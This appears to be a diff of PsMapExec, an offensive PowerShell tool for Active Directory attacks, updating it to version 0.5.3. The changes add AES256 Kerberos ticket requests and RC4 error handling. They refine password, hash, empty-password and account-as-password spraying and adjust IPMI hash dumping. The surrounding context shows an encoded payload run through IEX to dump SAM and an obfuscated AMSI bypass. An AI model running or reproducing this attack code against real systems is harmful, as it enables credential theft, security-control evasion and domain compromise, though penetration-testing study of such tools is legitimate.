@@ -243,7 +243,7 @@ Documentation: https://viperone.gitbook.io/pentest-everything/psmapexec
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.5.2")
+Version : 0.5.3")
 
     if (!$NoBanner) {
         Write-Output $Banner
@@ -864,19 +864,19 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
                 if ($UserDomain -ne "") {
                     if ($DomainController -ne "") {
-                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /opsec /force /ptt
+                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /dc:$DomainController /enctype:aes256 /opsec  /ptt
                     }
                     else {
-                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt
+                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /password:$Password /enctype:aes256 /opsec  /ptt
 
                     }
                 }
                 elseif ($UserDomain -eq "") {
                     if ($DomainController -ne "") {
-                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt
+                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /enctype:aes256 /opsec  /ptt
                     }
                     else {
-                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt
+                        $AskPassword = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /password:$Password /enctype:aes256 /opsec /ptt
                     }
                 }
 
@@ -895,6 +895,18 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                 if ($AskPassword -like "*NOWN*") {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "Principal not found"
+                    $InvalidCredentials = $true
+                    klist purge | Out-Null
+                    RestoreTicket
+                
+                    break
+                }
+
+                if ($AskPassword -like "*NOTSUPP*") {
+                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "RC4 not supported in domain or for this account"
+                    Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                    Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                     $InvalidCredentials = $true
                     klist purge | Out-Null
                     RestoreTicket
@@ -969,6 +981,18 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                         break
                     }
 
+                    if ($AskRC4 -like "*NOTSUPP*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "RC4 not supported in domain or for this account"
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+
                     if ($AskRC4 -like "*Unhandled rTickets exception:*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
@@ -996,18 +1020,18 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
 
                     if ($UserDomain -ne "") {
                         if ($DomainController -ne "") {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /enctype:aes256 /opsec  /ptt
                         }
                         else {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /enctype:aes256 /opsec  /ptt
                         }
                     }
                     elseif ($UserDomain -eq "") {
                         if ($DomainController -ne "") {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /enctype:aes256 /opsec  /ptt
                         }
                         else {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
+                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /enctype:aes256 /opsec  /ptt
                         }
                     }
 
@@ -1026,6 +1050,18 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     if ($Ask256 -like "*NOWN*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Principal not found"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+
+                    if ($Ask256 -like "*NOTSUPP*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "RC4 not supported in domain or for this account"
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                         $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
@@ -1102,6 +1138,18 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
                     if ($AskRC4 -like "*NOWN*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Principal not found"
+                        $InvalidCredentials = $true
+                        klist purge | Out-Null
+                        RestoreTicket
+                
+                        break
+                    }
+
+                    if ($AskRC4 -like "*NOTSUPP*") {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "RC4 not supported in domain or for this account"
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Try using -Password [Password] or -Hash [AES256] instead"
                         $InvalidCredentials = $true
                         klist purge | Out-Null
                         RestoreTicket
@@ -1745,44 +1793,45 @@ This flush operation clears the stored LDAP queries to prevent the reuse of resu
         }
     }
 
-if ($Method -eq "Spray") {
-    Write-Verbose "Performing user LDAP queries for method (Spray)"
-    $searcher = New-Searcher
-    if ($Targets -eq "AdminCount=1") {
-        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
-    } else {
-        $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
-    }
-    $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
-    $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
-    $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
-
-    if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users" -or $Targets -eq "AdminCount=1") {
-        $Targets = $EnabledDomainUsers
-    }
-    elseif (Test-Path $Targets -PathType Leaf) {
-        $EnabledDomainUsers = Get-Content -Path $Targets
-    }
-    elseif ($Targets -in $EnabledDomainUsers) {
-        $EnabledDomainUsers = $Targets
-    }
-    else {
-        $groupMembers = Get-GroupMembers -GroupName $Targets
-        if ($groupMembers.Count -gt 0) {
-            $EnabledDomainUsers = $groupMembers
-        }
-        elseif ($groupMembers.Count -eq 0) {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Group either does not exist or is empty"
-            return
+    if ($Method -eq "Spray") {
+        Write-Verbose "Performing user LDAP queries for method (Spray)"
+        $searcher = New-Searcher
+        if ($Targets -eq "AdminCount=1") {
+            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(adminCount=1)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
         }
         else {
-            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-            Write-Host "Unspecified Error"
-            return
+            $searcher.Filter = "(&(objectCategory=user)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!userAccountControl:1.2.840.113556.1.4.803:=16))"
+        }
+        $searcher.PropertiesToLoad.AddRange(@("samAccountName"))
+        $users = $searcher.FindAll() | Where-Object { $_.Properties["samAccountName"] -ne $null }
+        $EnabledDomainUsers = $users | ForEach-Object { $_.Properties["samAccountName"][0] }
+
+        if ($Targets -eq "" -or $Targets -eq "all" -or $Targets -eq "Domain Users" -or $Targets -eq "AdminCount=1") {
+            $Targets = $EnabledDomainUsers
+        }
+        elseif (Test-Path $Targets -PathType Leaf) {
+            $EnabledDomainUsers = Get-Content -Path $Targets
+        }
+        elseif ($Targets -in $EnabledDomainUsers) {
+            $EnabledDomainUsers = $Targets
+        }
+        else {
+            $groupMembers = Get-GroupMembers -GroupName $Targets
+            if ($groupMembers.Count -gt 0) {
+                $EnabledDomainUsers = $groupMembers
+            }
+            elseif ($groupMembers.Count -eq 0) {
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "Group either does not exist or is empty"
+                return
+            }
+            else {
+                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
+                Write-Host "Unspecified Error"
+                return
+            }
         }
     }
-}
 
 
 
@@ -2056,7 +2105,7 @@ g/FGwEikMF6QPjdo6gDZbW3wiW/Q1B3AfqAsylP8Gl11zGE1xGzWU+wWXWXNYTXFbNZT/BZddcjSe4Gj
 i5VQlvu4CNwSkfbXLVCvSPthGJkDy7QHNsRpC6H7zzU3LmbUi+wkgzcZUZL29/d5Tzgjg5Dqhv3H+v8A9eh9jGkfAAA=";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
 '@
 
-$Arbiter = @'
+    $Arbiter = @'
 Function Invoke-GuiltySpark {$X="5492868772801748688168747280728187173688878280688776828";$Y="1173680867656877679866880867644817687416876797271";[Ref]."A`ss`Embly"."GET`TY`Pe"((0..37|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'').GetField((38..51|%{[char][int](29+($X+$Y).Substring(($_*2),2))})-join'','NonPublic,Static').SetValue($null,$([Convert]::ToBoolean("True")))}
 Invoke-GuiltySpark
 '@
@@ -4058,6 +4107,13 @@ while (`$true) {
             Write-Host
             Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
             Write-Host "Spraying with Hash value: $SprayHash"
+            if ($SprayHash.Length -eq 64) {
+            
+                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                Write-Host "AES hashes are salted and unlikely to be valid for more than a single account"
+            
+            }
+            
             Write-Host
 
         }
@@ -4116,8 +4172,8 @@ while (`$true) {
                 }
                 # Hash Spraying
                 if ($SprayHash -ne "") {
-                    if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String }
-                    elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain | Out-String }
+                    if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String }
+                    elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain /enctype:aes256 | Out-String }
                     elseif ($SprayHash.Length -eq 65) {
                         $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
                         if ($colonCount -ne 1) {
@@ -4128,7 +4184,7 @@ while (`$true) {
                         }
                     
                         $SprayHash = $SprayHash.Split(':')[1]
-                        $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String
+                        $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain /force /opsec | Out-String
                     }
 
                     # Check for Unhandled exception
@@ -4145,6 +4201,13 @@ while (`$true) {
                             Write-Host "$Domain\$UserToSpray"
                         }   
                     }
+					
+                    # Check for RC4 Errors
+                    elseif ($Attempt.IndexOf("NOTSUPP") -ne -1) {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "$Domain\$UserToSpray - RC4 type not supported"
+                    }
+					
                     # Check for a value that only appears in a success status
                     elseif ($Attempt.IndexOf("NameService              :") -ne -1) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
@@ -4161,7 +4224,7 @@ while (`$true) {
                 if ($SprayPassword -ne "") {
                     
                     
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $SprayPassword)
+                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
         
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
@@ -4181,7 +4244,7 @@ while (`$true) {
                 # Account as password
                 if ($AccountAsPassword) {
 
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $UserToSpray)
+                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$UserToSpray")
         
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
@@ -4202,9 +4265,9 @@ while (`$true) {
 
                 # EmptyPasswords
                 if ($EmptyPassword) {
-                    $password = ""
+                    $SprayPassword = ""
        
-                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", $UserToSpray, $password)
+                    $Attempt = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Domain", "$Domain\$UserToSpray", "$SprayPassword")
         
                     if ($Attempt.name -ne $null) {
                         Write-Host "[+] " -ForegroundColor "Green" -NoNewline
@@ -4261,7 +4324,29 @@ while (`$true) {
             Write-Host
         }
  
- 
+        if (Test-Path "$Spraying\$Domain-EmptyPassword-Users.txt") {
+            $Unique = Get-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Verbose | Sort-Object -Unique
+            $Unique | Set-Content "$Spraying\$Domain-EmptyPassword-Users.txt" -Force
+            
+        }
+
+        if (Test-Path "$Spraying\$Domain-AccountAsPassword-Users.txt") {
+            $Unique = Get-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Verbose | Sort-Object -Unique
+            $Unique | Set-Content "$Spraying\$Domain-AccountAsPassword-Users.txt" -Force
+            
+        }
+
+        if (Test-Path "$Spraying\$Domain-Password-Users.txt") {
+            $Unique = Get-Content "$Spraying\$Domain-Password-Users.txt" -Verbose | Sort-Object -Unique
+            $Unique | Set-Content "$Spraying\$Domain-Password-Users.txt" -Force
+            
+        }
+
+        if (Test-Path "$Spraying\$Domain-Hashes-Users.txt") {
+            $Unique = Get-Content "$Spraying\$Domain-Hashes-Users.txt" -Verbose | Sort-Object -Unique
+            $Unique | Set-Content "$Spraying\$Domain-Hashes-Users.txt"
+            
+        }
  
     }
 
@@ -5337,7 +5422,8 @@ public class Advapi32 {
 
                     if ($attemptCount -eq $attemptLimit) {
                         if ($SuccessOnly) { $Sock.close ; return -111 }
-                        Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength 16
+                        if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength 16 }
+                        elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                         $Sock.Close()
                         return -111
                     }
@@ -5420,9 +5506,10 @@ public class Advapi32 {
                                 $Hash = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex + $rResponseSALTHex + '14' + $sUserLength2Hex + $sHexUserHex + ':' + $rResponseHashHex
                                 $Hash = $Hash.ToLower()
                                 $IPMISuccess = $True
+   
+                                if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength 16 }
+                                elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                                 
-                                Write-Host
-                                Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength 16
                                 Write-Host
                                 $User + ":" + $Hash | Write-Host
                                 
@@ -5535,14 +5622,14 @@ public class Advapi32 {
             if (!$IPAddress) {
                 $ComputerName = $computer.Properties["dnshostname"][0]
                 $OS = $computer.Properties["operatingSystem"][0]
+                $IP = if ((($Result = (New-Object System.Net.NetworkInformation.Ping).Send($ComputerName, 250)).Status) -eq 'Success') { $Result.Address.IPAddressToString }
+                try { Invoke-IPMIDump -IP $IP -Option $Option } Catch {}
             }
 
             elseif ($IPAddress) {
-                $ComputerName = "$Computer"
-                $OS = "OS:PLACEHOLDER"
+                $ComputerName = $Computer
+                Invoke-IPMIDump -IP $ComputerName -Option $Option
             }
-
-            Invoke-IPMIDump -IP $computer -Option $Option
 
         }
         
@@ -5771,6 +5858,10 @@ public class Advapi32 {
     ################################################## Function: Parse-SAM #########################################
     ################################################################################################################
     function Parse-SAM {
+
+    $AvailableMethods = "WMI","WinRM","SMB","MSSQL","SessionHunter"
+    if ($Method -notin $AvailableMethods){return}
+        
         $SamFull = Test-Path -Path "$PME\SAM\.SAM-Full.txt"
         if (-not $SamFull) {
             New-Item -Path "$PME\SAM\" -Name ".SAM-Full.txt" -ItemType "File" | Out-Null
@@ -5865,6 +5956,10 @@ public class Advapi32 {
     ################################################# Function: Parse-LogonPassword ################################
     ################################################################################################################
     function Parse-LogonPasswords {
+
+    $AvailableMethods = "WMI","WinRM","SMB","MSSQL","SessionHunter"
+    if ($Method -notin $AvailableMethods){return}
+
         Write-Host
         Write-Host
         Write-Host "Parsing Results" -ForegroundColor "Yellow"
@@ -6048,6 +6143,11 @@ public class Advapi32 {
     ################################################# Function: Parse-eKeys ########################################
     ################################################################################################################
     Function Parse-eKeys {
+
+
+        $AvailableMethods = "WMI","WinRM","SMB","MSSQL","SessionHunter"
+        if ($Method -notin $AvailableMethods){return}
+
         Write-Host
         Write-Host
         Write-Host "Parsing Results" -ForegroundColor "Yellow"
@@ -6160,6 +6260,9 @@ public class Advapi32 {
     ################################################################################################################
 
     function Parse-KerbDump {
+
+    $AvailableMethods = "WMI","WinRM","SMB","MSSQL","SessionHunter"
+    if ($Method -notin $AvailableMethods){return}
 
         Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
         Start-sleep -Seconds "2"
@@ -6309,6 +6412,10 @@ public class Advapi32 {
         param (
             [string]$DirectoryPath
         )
+
+
+    $AvailableMethods = "WMI","WinRM","SMB","MSSQL","SessionHunter"
+    if ($Method -notin $AvailableMethods){return}
 
         Write-Host "`n`nParsing Results" -ForegroundColor "Yellow"
         Start-sleep -Seconds "2"
